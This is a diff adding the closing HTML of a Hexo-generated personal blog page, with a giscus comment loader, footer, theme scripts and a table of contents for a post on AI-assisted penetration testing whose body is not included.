+                    inputPosition,
+                    reactionsEnabled,
+                    emitMetadata,
+                    strict,
+                };
+
+                if (mapping !== "number") {
+                    const term = getTerm();
+                    if (term) {
+                        setConfig.term = term;
+                    }
+                }
+
+                iframe.contentWindow.postMessage(
+                    { giscus: { setConfig } },
+                    "https://giscus.app",
+                );
+            };
+
+            const loadGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                const iframe = container.querySelector("iframe.giscus-frame");
+                if (iframe) {
+                    sendUpdate();
+                    return;
+                }
+
+                if (container.dataset.giscusInit === "true") {
+                    return;
+                }
+
+                const giscusConfig = {
+                    src: "https://giscus.app/client.js",
+                    "data-repo": "kivvs/kivvs.github.io",
+                    "data-repo-id": "R_kgDOT3J6Jg",
+                    "data-category": "Announcements",
+                    "data-category-id": "DIC_kwDOT3J6Js4DDSMc",
+                    "data-mapping": mapping,
+                    "data-strict": "0",
+                    "data-reactions-enabled": "1",
+                    "data-emit-metadata": "1",
+                    "data-theme": "preferred_color_scheme",
+                    "data-lang": lang,
+                    "data-input-position": inputPosition,
+                    "data-loading": loading,
+                    crossorigin: "anonymous",
+                    async: true,
+                };
+
+                const giscusScript = document.createElement("script");
+                for (const key in giscusConfig) {
+                    giscusScript.setAttribute(key, giscusConfig[key]);
+                }
+                container.appendChild(giscusScript);
+                container.dataset.giscusInit = "true";
+            };
+
+            const runGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                if (container.querySelector("iframe.giscus-frame")) {
+                    sendUpdate();
+                    return;
+                }
+
+                loadGiscus();
+            };
+
+            runGiscus();
+        })();
+    </script>
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">基于AI大模型的辅助渗透和AI边界与角色的察觉</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89"><span class="nav-text">基于AI大模型的辅助渗透和AI边界与角色的察觉</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E5%85%88%E8%AF%B4%E6%98%8E"><span class="nav-text">事先说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%98%B6%E6%AE%B5"><span class="nav-text">一、信息收集阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E9%98%B6%E6%AE%B5"><span class="nav-text">二、漏洞发现阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5"><span class="nav-text">三、漏洞利用阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%8A%A5%E5%91%8A%E9%98%B6%E6%AE%B5"><span class="nav-text">四、报告阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kivvs</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 21 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
